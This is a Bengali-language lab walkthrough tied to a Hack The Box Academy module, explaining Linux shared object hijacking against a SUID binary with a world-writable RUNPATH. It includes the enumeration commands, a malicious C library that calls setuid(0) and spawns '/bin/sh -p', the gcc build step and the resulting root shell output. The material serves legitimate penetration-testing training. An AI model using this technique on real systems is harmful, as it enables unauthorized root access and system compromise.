# Shared Object Hijacking - [LINK](https://academy.hackthebox.com/app/module/51/section/476)


ডেভেলপমেন্টের সময় অনেক লিনাক্স প্রোগ্রাম কাস্টম ডাইনামিক লাইব্রেরি ব্যবহার করে। যদি কোনো SUID পারমিশন থাকা প্রোগ্রামের লাইব্রেরি লোড করার পাথ (Path) ভুলভাবে কনফিগার করা থাকে, তবে আমরা সেখানে নিজস্ব ম্যালিশিয়াস লাইব্রেরি ইনজেক্ট করে খুব সহজেই রুট (root) প্রিভিলেজ নিতে পারি। CPTS ল্যাবগুলোতে এবং বাস্তব রেড টিমিং অ্যাসেসমেন্টে এই ধরনের দুর্বলতা প্রায়ই দেখা যায়।

পুরো অ্যাটাক প্রসেসটি নিচে ধাপে ধাপে ব্রেকডাউন করা হলো:

**ধাপ ১: ldd দিয়ে ডিপেন্ডেন্সি চেক করা**
সিস্টেমে কোনো SUID বাইনারি (যেমন: `payroll`) পাওয়ার পর প্রথম কাজ হলো `ldd` কমান্ড দিয়ে চেক করা যে এটি রান করার জন্য কোন কোন `.so` (Shared Object) ফাইল খুঁজছে।

```bash
htb-student@NIX02:~$ ldd payroll

```

আউটপুটে যদি সাধারণ সিস্টেম লাইব্রেরির পাশাপাশি নন-স্ট্যান্ডার্ড কোনো লাইব্রেরি (যেমন `/development/libshared.so`) দেখা যায়, তবে সেটি আমাদের টার্গেট হতে পারে।

**ধাপ ২: RUNPATH এবং ডিরেক্টরি পারমিশন চেক করা**
প্রোগ্রামটি ঠিক কোথা থেকে লাইব্রেরি লোড করতে চাইছে তা নিশ্চিত হওয়ার জন্য `readelf` ইউটিলিটি ব্যবহার করা হয়।

```bash
htb-student@NIX02:~$ readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]

```

এখানে দেখা যাচ্ছে প্রোগ্রামটির RUNPATH হলো `/development`। লিনাক্স লাইব্রেরি খোঁজার সময় সিস্টেমের অন্য ফোল্ডারের চেয়ে RUNPATH কে বেশি অগ্রাধিকার দেয়।

এখন আমাদের চেক করতে হবে `/development` ফোল্ডারে আমাদের ফাইল রাখার পারমিশন আছে কিনা:

```bash
htb-student@NIX02:~$ ls -la /development/

```

যদি ফোল্ডারটি সবার জন্য রাইটেবল (World-writable, যেমন `drwxrwxrwx`) হয়, তবে এটি হ্যাক করার জন্য একদম প্রস্তুত।

**ধাপ ৩: কাঙ্ক্ষিত ফাংশনের নাম (Symbol) খুঁজে বের করা**
ম্যালিশিয়াস লাইব্রেরি বানানোর আগে আমাদের জানতে হবে প্রোগ্রামটি আসল লাইব্রেরির ভেতর ঠিক কোন ফাংশনটিকে কল করছে। এটি বের করার একটি চমৎকার ট্রিক হলো, সিস্টেমের অন্য যেকোনো সাধারণ লাইব্রেরিকে (যেমন `libc.so.6`) কপি করে টার্গেট ফোল্ডারে `libshared.so` নামে রেখে দেওয়া।

```bash
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
htb-student@NIX02:~$ ./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery

```

প্রোগ্রামটি রান করলে একটি "symbol lookup error" আসবে, কারণ আমরা একটি ভুল লাইব্রেরি দিয়েছি। কিন্তু এই এরর মেসেজ থেকেই আমরা জেনে গেলাম যে প্রোগ্রামটি আসলে **`dbquery`** নামের একটি ফাংশন খুঁজছে!

**ধাপ ৪: ম্যালিশিয়াস C লাইব্রেরি তৈরি এবং কম্পাইল করা**
যেহেতু আপনি C প্রোগ্রামিং নিয়ে কাজ করেন, তাই এই অংশটি বেশ পরিচিত লাগবে। আমরা `dbquery` নামে একটি C ফাংশন লিখব যা `setuid(0)` ব্যবহার করে রুট পারমিশন নেবে এবং একটি শেল ওপেন করবে।

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}

```

কোডটি লেখা হয়ে গেলে `gcc` দিয়ে এটিকে ডাইনামিক শেয়ার্ড অবজেক্ট হিসেবে কম্পাইল করে ঠিক সেই জায়গায় সেভ করতে হবে, যেখানে আসল প্রোগ্রামটি লাইব্রেরি খুঁজছে:

```bash
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so

```

**ধাপ ৫: অ্যাটাক এক্সিকিউট করা**
সবকিছু প্রস্তুত। এবার শুধু আসল SUID প্রোগ্রামটি রান করার পালা।

```bash
htb-student@NIX02:~$ ./payroll 

```

প্রোগ্রামটি রান হওয়ার সময় তার RUNPATH অনুযায়ী `/development` ফোল্ডারে যাবে এবং সেখানে আমাদের বানানো ম্যালিশিয়াস `libshared.so` ফাইলটি পেয়ে সেটিকেই আসল ভেবে মেমোরিতে লোড করে নেবে। লোড হওয়ার সাথে সাথেই আমাদের ফাংশনটি ট্রিগার হবে এবং আমরা সরাসরি রুট শেল পেয়ে যাব।

```bash
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)

```
